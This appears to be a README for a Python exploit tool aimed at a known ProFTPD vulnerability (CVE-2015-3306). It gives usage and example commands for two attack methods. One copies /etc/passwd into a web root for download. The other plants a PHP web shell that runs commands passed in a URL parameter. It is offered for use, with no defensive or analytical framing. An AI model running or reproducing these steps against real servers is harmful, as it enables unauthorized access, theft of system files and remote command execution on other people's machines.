# cpx_proftpd.py (by daldana)

Tool for exploit CVE-2015-3306

METHOD 1:
--------
usage: 
  python cpx_proftp.py 1 &lt;IP&gt; &lt;REMOTE_FULLPATH_SRC_FILE&gt; &lt;REMOTE_FULLPATH_DST_FILE&gt;

ex:
  python cpx_proftp.py 1 127.0.0.1 /etc/passwd /var/www/pass.txt

then try:
  http://127.0.0.1/pass.txt

METHOD 2:
--------

usage: 
  python cpx_proftp.py 2 &lt;IP&gt; &lt;REMOTE_FULLPATH_APACHE2&gt;

ex:
  python cpx_proftp.py 2 127.0.0.1 /var/www/html

then try:
  http://127.0.0.1/xxx.php?img=ls
